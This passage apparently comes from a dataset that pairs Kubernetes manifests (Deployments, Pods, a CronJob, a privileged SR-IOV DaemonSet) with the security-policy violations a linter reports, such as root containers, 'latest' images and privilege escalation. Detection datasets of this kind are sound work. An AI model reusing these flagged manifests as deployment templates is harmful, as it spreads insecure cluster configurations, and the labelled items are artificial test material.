DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 46bcf702811226edac90b77c43cdbfec99bc6fe6\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "04001",
    "manifest_path": "data/manifests/the_stack_sample/sample_1795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9889\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04002",
    "manifest_path": "data/manifests/the_stack_sample/sample_1795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9889\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "04003",
    "manifest_path": "data/manifests/the_stack_sample/sample_1795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9889\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "04004",
    "manifest_path": "data/manifests/the_stack_sample/sample_1795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9889\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "04005",
    "manifest_path": "data/manifests/the_stack_sample/sample_1795.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9889\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "04006",
    "manifest_path": "data/manifests/the_stack_sample/sample_1801.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rollem-prod-20-deployment\nspec:\n  selector:\n    matchLabels:\n      app: rollem-prod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rollem-prod\n    spec:\n      containers:\n      - name: rollem-shard-20\n        image: lemtzas/rollem-discord:2.6.4\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250M\n        env:\n        - name: reboot\n          value: '2021-04-20'\n        - name: DISCORD_BOT_SHARD_ID\n          value: '20'\n        - name: DISCORD_BOT_SHARD_COUNT\n          value: '50'\n        - name: DISCORD_BOT_USER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DISCORD_BOT_USER_TOKEN\n        - name: APPINSIGHTS_CONNECTIONSTRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: APPINSIGHTS_CONNECTIONSTRING\n        - name: DEFER_TO_CLIENT_IDS\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DEFER_TO_CLIENT_IDS\n        - name: DB_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DB_CONNECTION_STRING\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rollem-shard-20\" does not have a read-only root file system"
  },
  {
    "id": "04007",
    "manifest_path": "data/manifests/the_stack_sample/sample_1801.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rollem-prod-20-deployment\nspec:\n  selector:\n    matchLabels:\n      app: rollem-prod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rollem-prod\n    spec:\n      containers:\n      - name: rollem-shard-20\n        image: lemtzas/rollem-discord:2.6.4\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250M\n        env:\n        - name: reboot\n          value: '2021-04-20'\n        - name: DISCORD_BOT_SHARD_ID\n          value: '20'\n        - name: DISCORD_BOT_SHARD_COUNT\n          value: '50'\n        - name: DISCORD_BOT_USER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DISCORD_BOT_USER_TOKEN\n        - name: APPINSIGHTS_CONNECTIONSTRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: APPINSIGHTS_CONNECTIONSTRING\n        - name: DEFER_TO_CLIENT_IDS\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DEFER_TO_CLIENT_IDS\n        - name: DB_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DB_CONNECTION_STRING\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rollem-shard-20\" is not set to runAsNonRoot"
  },
  {
    "id": "04008",
    "manifest_path": "data/manifests/the_stack_sample/sample_1801.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rollem-prod-20-deployment\nspec:\n  selector:\n    matchLabels:\n      app: rollem-prod\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rollem-prod\n    spec:\n      containers:\n      - name: rollem-shard-20\n        image: lemtzas/rollem-discord:2.6.4\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250M\n        env:\n        - name: reboot\n          value: '2021-04-20'\n        - name: DISCORD_BOT_SHARD_ID\n          value: '20'\n        - name: DISCORD_BOT_SHARD_COUNT\n          value: '50'\n        - name: DISCORD_BOT_USER_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DISCORD_BOT_USER_TOKEN\n        - name: APPINSIGHTS_CONNECTIONSTRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: APPINSIGHTS_CONNECTIONSTRING\n        - name: DEFER_TO_CLIENT_IDS\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DEFER_TO_CLIENT_IDS\n        - name: DB_CONNECTION_STRING\n          valueFrom:\n            secretKeyRef:\n              name: rollem-prod-2\n              key: DB_CONNECTION_STRING\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rollem-shard-20\" has memory limit 0"
  },
  {
    "id": "04009",
    "manifest_path": "data/manifests/the_stack_sample/sample_1802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: digilocker-support-api\n  name: digilocker-support-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: digilocker-support-api\n  template:\n    metadata:\n      labels:\n        k8s-app: digilocker-support-api\n    spec:\n      containers:\n      - image: REGISTRY/digilocker_support_api:latest\n        imagePullPolicy: Always\n        name: digilocker-support-api\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"digilocker-support-api\" is using an invalid container image, \"REGISTRY/digilocker_support_api:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04010",
    "manifest_path": "data/manifests/the_stack_sample/sample_1802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: digilocker-support-api\n  name: digilocker-support-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: digilocker-support-api\n  template:\n    metadata:\n      labels:\n        k8s-app: digilocker-support-api\n    spec:\n      containers:\n      - image: REGISTRY/digilocker_support_api:latest\n        imagePullPolicy: Always\n        name: digilocker-support-api\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"digilocker-support-api\" does not have a read-only root file system"
  },
  {
    "id": "04011",
    "manifest_path": "data/manifests/the_stack_sample/sample_1802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: digilocker-support-api\n  name: digilocker-support-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: digilocker-support-api\n  template:\n    metadata:\n      labels:\n        k8s-app: digilocker-support-api\n    spec:\n      containers:\n      - image: REGISTRY/digilocker_support_api:latest\n        imagePullPolicy: Always\n        name: digilocker-support-api\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"digilocker-support-api\" is not set to runAsNonRoot"
  },
  {
    "id": "04012",
    "manifest_path": "data/manifests/the_stack_sample/sample_1802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: digilocker-support-api\n  name: digilocker-support-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: digilocker-support-api\n  template:\n    metadata:\n      labels:\n        k8s-app: digilocker-support-api\n    spec:\n      containers:\n      - image: REGISTRY/digilocker_support_api:latest\n        imagePullPolicy: Always\n        name: digilocker-support-api\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"digilocker-support-api\" has cpu request 0"
  },
  {
    "id": "04013",
    "manifest_path": "data/manifests/the_stack_sample/sample_1802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: digilocker-support-api\n  name: digilocker-support-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: digilocker-support-api\n  template:\n    metadata:\n      labels:\n        k8s-app: digilocker-support-api\n    spec:\n      containers:\n      - image: REGISTRY/digilocker_support_api:latest\n        imagePullPolicy: Always\n        name: digilocker-support-api\n        envFrom:\n        - configMapRef:\n            name: divoc-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"digilocker-support-api\" has memory limit 0"
  },
  {
    "id": "04014",
    "manifest_path": "data/manifests/the_stack_sample/sample_1803.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210723-55eee17612\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --only=ti-community-infra/tichi,ti-community-infra/configs,ti-community-infra/ti-community-bot,ti-community-infra/ti-challenge-bot,ti-community-infra/rfcs,ti-community-infra/devstats,ti-community-infra/devstats-dev-guide,pingcap/community,pingcap/docs,pingcap/docs-cn,pingcap/docs-dm,pingcap/docs-tidb-operator,pingcap/ticdc,tikv/community,tikv/pd,chaos-mesh/website,chaos-mesh/website-zh\n          - --token=/etc/github/token\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: labels-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "04015",
    "manifest_path": "data/manifests/the_stack_sample/sample_1803.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210723-55eee17612\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --only=ti-community-infra/tichi,ti-community-infra/configs,ti-community-infra/ti-community-bot,ti-community-infra/ti-challenge-bot,ti-community-infra/rfcs,ti-community-infra/devstats,ti-community-infra/devstats-dev-guide,pingcap/community,pingcap/docs,pingcap/docs-cn,pingcap/docs-dm,pingcap/docs-tidb-operator,pingcap/ticdc,tikv/community,tikv/pd,chaos-mesh/website,chaos-mesh/website-zh\n          - --token=/etc/github/token\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: labels-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "04016",
    "manifest_path": "data/manifests/the_stack_sample/sample_1803.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210723-55eee17612\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --only=ti-community-infra/tichi,ti-community-infra/configs,ti-community-infra/ti-community-bot,ti-community-infra/ti-challenge-bot,ti-community-infra/rfcs,ti-community-infra/devstats,ti-community-infra/devstats-dev-guide,pingcap/community,pingcap/docs,pingcap/docs-cn,pingcap/docs-dm,pingcap/docs-tidb-operator,pingcap/ticdc,tikv/community,tikv/pd,chaos-mesh/website,chaos-mesh/website-zh\n          - --token=/etc/github/token\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: labels-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "04017",
    "manifest_path": "data/manifests/the_stack_sample/sample_1803.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: prow\n  name: label-sync\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: label-sync\n          image: gcr.io/k8s-prow/label_sync:v20210723-55eee17612\n          args:\n          - --config=/etc/config/labels.yaml\n          - --confirm=true\n          - --only=ti-community-infra/tichi,ti-community-infra/configs,ti-community-infra/ti-community-bot,ti-community-infra/ti-challenge-bot,ti-community-infra/rfcs,ti-community-infra/devstats,ti-community-infra/devstats-dev-guide,pingcap/community,pingcap/docs,pingcap/docs-cn,pingcap/docs-dm,pingcap/docs-tidb-operator,pingcap/ticdc,tikv/community,tikv/pd,chaos-mesh/website,chaos-mesh/website-zh\n          - --token=/etc/github/token\n          volumeMounts:\n          - name: github-token\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n        volumes:\n        - name: github-token\n          secret:\n            secretName: github-token\n        - name: config\n          configMap:\n            name: labels-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "04018",
    "manifest_path": "data/manifests/the_stack_sample/sample_1810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: smtp\n  name: smtp\n  namespace: utils\nspec:\n  selector:\n    matchLabels:\n      app: smtp\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: smtp\n    spec:\n      containers:\n      - image: devture/exim-relay:4.94.2-r0-3\n        imagePullPolicy: Always\n        name: smtp\n        env:\n        - name: TZ\n          value: Europe/Zurich\n        - name: smtp.int.eighty-three.me\n        - name: SMARTHOST\n          value: smtp.sendgrid.net::587\n        - name: SMTP_USERNAME\n          value: apikey\n        - name: SMTP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: smtp-password\n              key: password\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n          limits:\n            cpu: 400m\n            memory: 100Mi\n        ports:\n        - containerPort: 8025\n        livenessProbe:\n          exec:\n            command:\n            - exim\n            - -bt\n            - test@tuxpeople.org\n          initialDelaySeconds: 10\n          periodSeconds: 10\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"smtp\" does not have a read-only root file system"
  },
  {
    "id": "04019",
    "manifest_path": "data/manifests/the_stack_sample/sample_1810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: smtp\n  name: smtp\n  namespace: utils\nspec:\n  selector:\n    matchLabels:\n      app: smtp\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: smtp\n    spec:\n      containers:\n      - image: devture/exim-relay:4.94.2-r0-3\n        imagePullPolicy: Always\n        name: smtp\n        env:\n        - name: TZ\n          value: Europe/Zurich\n        - name: smtp.int.eighty-three.me\n        - name: SMARTHOST\n          value: smtp.sendgrid.net::587\n        - name: SMTP_USERNAME\n          value: apikey\n        - name: SMTP_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: smtp-password\n              key: password\n        resources:\n          requests:\n            cpu: 10m\n            memory: 10Mi\n          limits:\n            cpu: 400m\n            memory: 100Mi\n        ports:\n        - containerPort: 8025\n        livenessProbe:\n          exec:\n            command:\n            - exim\n            - -bt\n            - test@tuxpeople.org\n          initialDelaySeconds: 10\n          periodSeconds: 10\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"smtp\" is not set to runAsNonRoot"
  },
  {
    "id": "04020",
    "manifest_path": "data/manifests/the_stack_sample/sample_1811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: motive-back-end-deployment\nspec:\n  template:\n    metadata:\n      name: motive-back-end-pod\n      labels:\n        app: motive-back-end\n    spec:\n      containers:\n      - name: motive-back-end-container\n        image: $FULL_IMAGE\n        imagePullPolicy: Always\n        env:\n        - name: DATABASE_URL\n          value: $DATABASE_JDBC_URL\n        - name: DATABASE_USERNAME\n          valueFrom:\n            configMapKeyRef:\n              name: motive-config\n              key: postgres-username\n              optional: false\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: $APP_DATABASE_NAME-postgresql\n              key: postgres-password\n              optional: false\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n        livenessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n  replicas: 2\n  selector:\n    matchLabels:\n      app: motive-back-end\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"motive-back-end-container\" is using an invalid container image, \"$FULL_IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "04021",
    "manifest_path": "data/manifests/the_stack_sample/sample_1811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: motive-back-end-deployment\nspec:\n  template:\n    metadata:\n      name: motive-back-end-pod\n      labels:\n        app: motive-back-end\n    spec:\n      containers:\n      - name: motive-back-end-container\n        image: $FULL_IMAGE\n        imagePullPolicy: Always\n        env:\n        - name: DATABASE_URL\n          value: $DATABASE_JDBC_URL\n        - name: DATABASE_USERNAME\n          valueFrom:\n            configMapKeyRef:\n              name: motive-config\n              key: postgres-username\n              optional: false\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: $APP_DATABASE_NAME-postgresql\n              key: postgres-password\n              optional: false\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n        livenessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n  replicas: 2\n  selector:\n    matchLabels:\n      app: motive-back-end\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"motive-back-end-container\" does not have a read-only root file system"
  },
  {
    "id": "04022",
    "manifest_path": "data/manifests/the_stack_sample/sample_1811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: motive-back-end-deployment\nspec:\n  template:\n    metadata:\n      name: motive-back-end-pod\n      labels:\n        app: motive-back-end\n    spec:\n      containers:\n      - name: motive-back-end-container\n        image: $FULL_IMAGE\n        imagePullPolicy: Always\n        env:\n        - name: DATABASE_URL\n          value: $DATABASE_JDBC_URL\n        - name: DATABASE_USERNAME\n          valueFrom:\n            configMapKeyRef:\n              name: motive-config\n              key: postgres-username\n              optional: false\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: $APP_DATABASE_NAME-postgresql\n              key: postgres-password\n              optional: false\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n        livenessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n  replicas: 2\n  selector:\n    matchLabels:\n      app: motive-back-end\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"motive-back-end-container\" is not set to runAsNonRoot"
  },
  {
    "id": "04023",
    "manifest_path": "data/manifests/the_stack_sample/sample_1811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: motive-back-end-deployment\nspec:\n  template:\n    metadata:\n      name: motive-back-end-pod\n      labels:\n        app: motive-back-end\n    spec:\n      containers:\n      - name: motive-back-end-container\n        image: $FULL_IMAGE\n        imagePullPolicy: Always\n        env:\n        - name: DATABASE_URL\n          value: $DATABASE_JDBC_URL\n        - name: DATABASE_USERNAME\n          valueFrom:\n            configMapKeyRef:\n              name: motive-config\n              key: postgres-username\n              optional: false\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: $APP_DATABASE_NAME-postgresql\n              key: postgres-password\n              optional: false\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n        livenessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n  replicas: 2\n  selector:\n    matchLabels:\n      app: motive-back-end\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"motive-back-end-container\" has cpu request 0"
  },
  {
    "id": "04024",
    "manifest_path": "data/manifests/the_stack_sample/sample_1811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: motive-back-end-deployment\nspec:\n  template:\n    metadata:\n      name: motive-back-end-pod\n      labels:\n        app: motive-back-end\n    spec:\n      containers:\n      - name: motive-back-end-container\n        image: $FULL_IMAGE\n        imagePullPolicy: Always\n        env:\n        - name: DATABASE_URL\n          value: $DATABASE_JDBC_URL\n        - name: DATABASE_USERNAME\n          valueFrom:\n            configMapKeyRef:\n              name: motive-config\n              key: postgres-username\n              optional: false\n        - name: DATABASE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: $APP_DATABASE_NAME-postgresql\n              key: postgres-password\n              optional: false\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n        livenessProbe:\n          initialDelaySeconds: 120\n          httpGet:\n            port: 8080\n            path: /actuator/health\n  replicas: 2\n  selector:\n    matchLabels:\n      app: motive-back-end\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"motive-back-end-container\" has memory limit 0"
  },
  {
    "id": "04025",
    "manifest_path": "data/manifests/the_stack_sample/sample_1812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-sriov-device-plugin-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: sriovdp\nspec:\n  selector:\n    matchLabels:\n      name: sriov-device-plugin\n  template:\n    metadata:\n      labels:\n        name: sriov-device-plugin\n        tier: node\n        app: sriovdp\n    spec:\n      serviceAccountName: sriov-device-plugin\n      containers:\n      - name: kube-sriovdp\n        image: docker.io/nfvpe/sriov-device-plugin:v3.1\n        imagePullPolicy: Never\n        args:\n        - --log-dir=sriovdp\n        - --log-level=10\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: devicesock\n          mountPath: /var/lib/kubelet/\n          readOnly: false\n        - name: log\n          mountPath: /var/log\n        - name: config-volume\n          mountPath: /etc/pcidp\n      volumes:\n      - name: devicesock\n        hostPath:\n          path: /var/lib/kubelet/\n      - name: log\n        hostPath:\n          path: /var/log\n      - name: config-volume\n        configMap:\n          name: sriovdp-config\n          items:\n          - key: config.json\n            path: config.json\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-sriovdp\" does not have a read-only root file system"
  },
  {
    "id": "04026",
    "manifest_path": "data/manifests/the_stack_sample/sample_1812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-sriov-device-plugin-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: sriovdp\nspec:\n  selector:\n    matchLabels:\n      name: sriov-device-plugin\n  template:\n    metadata:\n      labels:\n        name: sriov-device-plugin\n        tier: node\n        app: sriovdp\n    spec:\n      serviceAccountName: sriov-device-plugin\n      containers:\n      - name: kube-sriovdp\n        image: docker.io/nfvpe/sriov-device-plugin:v3.1\n        imagePullPolicy: Never\n        args:\n        - --log-dir=sriovdp\n        - --log-level=10\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: devicesock\n          mountPath: /var/lib/kubelet/\n          readOnly: false\n        - name: log\n          mountPath: /var/log\n        - name: config-volume\n          mountPath: /etc/pcidp\n      volumes:\n      - name: devicesock\n        hostPath:\n          path: /var/lib/kubelet/\n      - name: log\n        hostPath:\n          path: /var/log\n      - name: config-volume\n        configMap:\n          name: sriovdp-config\n          items:\n          - key: config.json\n            path: config.json\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"kube-sriovdp\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "04027",
    "manifest_path": "data/manifests/the_stack_sample/sample_1812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-sriov-device-plugin-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: sriovdp\nspec:\n  selector:\n    matchLabels:\n      name: sriov-device-plugin\n  template:\n    metadata:\n      labels:\n        name: sriov-device-plugin\n        tier: node\n        app: sriovdp\n    spec:\n      serviceAccountName: sriov-device-plugin\n      containers:\n      - name: kube-sriovdp\n        image: docker.io/nfvpe/sriov-device-plugin:v3.1\n        imagePullPolicy: Never\n        args:\n        - --log-dir=sriovdp\n        - --log-level=10\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: devicesock\n          mountPath: /var/lib/kubelet/\n          readOnly: false\n        - name: log\n          mountPath: /var/log\n        - name: config-volume\n          mountPath: /etc/pcidp\n      volumes:\n      - name: devicesock\n        hostPath:\n          path: /var/lib/kubelet/\n      - name: log\n        hostPath:\n          path: /var/log\n      - name: config-volume\n        configMap:\n          name: sriovdp-config\n          items:\n          - key: config.json\n            path: config.json\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"kube-sriovdp\" is privileged"
  },
  {
    "id": "04028",
    "manifest_path": "data/manifests/the_stack_sample/sample_1812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-sriov-device-plugin-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: sriovdp\nspec:\n  selector:\n    matchLabels:\n      name: sriov-device-plugin\n  template:\n    metadata:\n      labels:\n        name: sriov-device-plugin\n        tier: node\n        app: sriovdp\n    spec:\n      serviceAccountName: sriov-device-plugin\n      containers:\n      - name: kube-sriovdp\n        image: docker.io/nfvpe/sriov-device-plugin:v3.1\n        imagePullPolicy: Never\n        args:\n        - --log-dir=sriovdp\n        - --log-level=10\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - name: devicesock\n          mountPath: /var/lib/kubelet/\n          readOnly: false\n        - name: log\n          mountPath: /var/log\n        - name: config-volume\n          mountPath: /etc/pcidp\n      volumes:\n      - name: devicesock\n        hostPath:\n          path: /var/lib/kubelet/\n      - name: log\n        hostPath:\n          path: /var/log\n      - name: config-volume\n        configMap:\n          name: sriovdp-config\n          items:\n          - key: config.json\n            path: config.json\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-sriovdp\" is not set to runAsNonRoot"
  },
  {
    "id": "04029",
    "manifest_path": "data/manifests/the_stack_sample/sample_1812.yaml",
